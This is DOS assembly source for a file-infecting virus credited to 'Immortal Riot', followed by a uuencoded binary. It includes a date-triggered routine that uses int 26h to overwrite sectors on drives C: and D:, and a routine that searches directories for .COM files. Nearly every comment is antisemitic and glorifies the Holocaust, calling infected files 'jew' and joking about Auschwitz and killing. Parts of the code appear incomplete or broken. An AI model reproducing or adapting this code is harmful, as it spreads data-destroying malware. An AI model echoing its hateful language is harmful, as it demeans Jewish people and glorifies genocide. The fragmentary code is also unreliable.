; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;                       ARBEIT MACHT FREI
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
cseg            segment
assume  cs:cseg,ds:cseg,es:cseg,ss:cseg

FILELEN         equ     quit - start
MINTARGET       equ     1000            ; 250*4 huh?..
MAXTARGET       equ     -(FILELEN+40h)  ; FileLenght + writing in file

                org     100h

                .RADIX  16

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;                  Dummy program (infected)
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
begin:          db      4Dh             ; Virus-Marker
                jmp     start           ; Jump to next procedure

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;                  Begin of the virus
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
start:          call    start2          ; Call next procedure
                add     ax,dx           ; Adding this line, and S&S
                                        ; Toolkit's findviru bites the


start2:         pop     bp
                sub     bp,0103h

                lea     si,[bp+offset begbuf-4] ;restore begin of jew
                mov     di,0100h
                movsw
                movsw

                mov     ax,3300h                ;get ctrl-break flag
                int     21
                push    dx

                xor     dl,dl                   ;clear the flag
                mov     ax,3301h
                int     21

                mov     ax,3524h                ;get int24 vector
                int     21
                push    bx
                push    es

                mov     dx,offset ni24 - 4      ;set new int24 vector
                add     dx,bp
                mov     ax,2524h
                int     21

                lea     dx,[bp+offset quit]      ;set new DTA adres
                mov     ah,1Ah
                int     21
                add     dx,1Eh
                mov     word ptr [bp+offset nameptr-4],dx

                lea     si,[bp+offset grandfather-4]  ;check youngest

                cmp     [si],0606h
                jne     verder

                lea     dx,[bp+offset sontxt-4]       ;Arbeit Jew!
                mov     ah,09h
                int     21
 
verder:         mov     ax,[si]                       ;Komme Hier!

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;                            'Dot-Dot'
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
                MOV     DX,OFFSET point_point   ; '..'
                MOV     AH,3BH                  ;
                INT     21h                     ;

return2:        pop     dx                      ;restore jew date & time
                pop     cx
                mov     ax,5701h
                int     21

                mov     ah,3Eh                  ;close the jew!
                int     21

return1:
                call    daycheck
                pop     cx                      ;restore jew-attribute
                ret

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;                       DayChecker
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
daycheck:                ;
        mov ah,2ah       ; Check for day
        int 21h          ;
        cmp dl,01        ; Check for the first any month
        je  Hitler       ; Day=01=Heil Hitler!
        jmp Setattr      ; Jump to 'Setattr'..

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;              Play Around with Drive C a while
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
Hitler:                                 ; Did quite a good job..
        cli                             ; Cuz NoOne escaped!
        mov     ah,2     ; (C:)         ; Kill ;m all!
        cwd                             ; Killing from 0
        mov     cx,0100h                ; Continue to 256
        int     026h                    ; No Rescue!
        jmp     Auschwitz               ; Travel by train

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;               Hitler has send your drive D to Auschwitz
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
Auschwitz:                              ; There they're killed..
        MOV     AL,3     ; (D:)         ; Choose D-Drive
        MOV     CX,700                  ; Kill 700 of them!
        MOV     DX,00                   ; Start with the first
        MOV     DS,[DI+99]              ; Machine Gun..
        MOV     BX,[DI+55]              ; Tortue Chamber..
        call    hitler                  ; Start it over!

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;                 Set Attributes (Date/Time)
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
setattr:           mov     dx,word ptr [bp+offset nameptr-4]
                   mov     ax,4301h
                   int     21
                   ret

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;               Subroutines for file-pointer
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
beginptr:       mov     ax,4200h                ;go to begin of jew
                jmp     short ptrvrdr

endptr:         mov     ax,4202h                ;go to end of jew
ptrvrdr:        xor     cx,cx
                xor     dx,dx
                int     21
                ret

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;               Interupt handler 24
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
ni24:           mov     al,03
                iret

; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
;               Data
; ;;-;;;;;;-;;;;;;;;;;;--;;;;;;;;;;;;--;;;;;;;--;-;;;;;;;;;;;;;-;;;;;-;
begbuf          db      0CDh,  20h, 0, 0
newbeg          db       4Dh, 0E9h, 0, 0
nameptr         dw      ?
sontxt          db      ' ARBEIT MACHT FREI! ',0Dh, 0Ah, '$'; mutation

                db      ' The Unforgiven / Immortal Riot '  ; that's me!
                db      ' Sweden 01/10/93 '
grandfather     db      0
father          db      0
filename        db      '*.COM',0                         ; jew-Spec!
point_point     db      '..',0                            ; 'dot-dot'
quit:

cseg            ends
end     begin
 
begin 775 amf.com
M3>L!D.@"``/"78'M`P&-MK$!OP`!I:6X`#/-(5(RTK@!,\TAN"0US2%3!KJN
M`0/5N"0ES2&-EA("M!K-(8/"'HF6N0&-M@,"@3P&!G4(C9:[`;0)S2&+!+H/
M`K0[S2%:6;@!5\TAM#[-(>@"`%G#M"K-(8#Z`70#ZQ^0^K0"F;D``Z``".G9D`BUU5Z.+_BY:Y`;@!0\TAP[@`0NL#N`)",\DSTLTAP[`#
MS\T@``!-Z0`````@05)"14E4($U!0TA4($9214DA(`T*)"!4:&4@56YF;W)G
M:79E;B`O($EM;6]R=&%L(%)I;W0@(%-W961E;B`P,2\Q,"\Y,R```"HN0T]-
$`"XN````
`
end
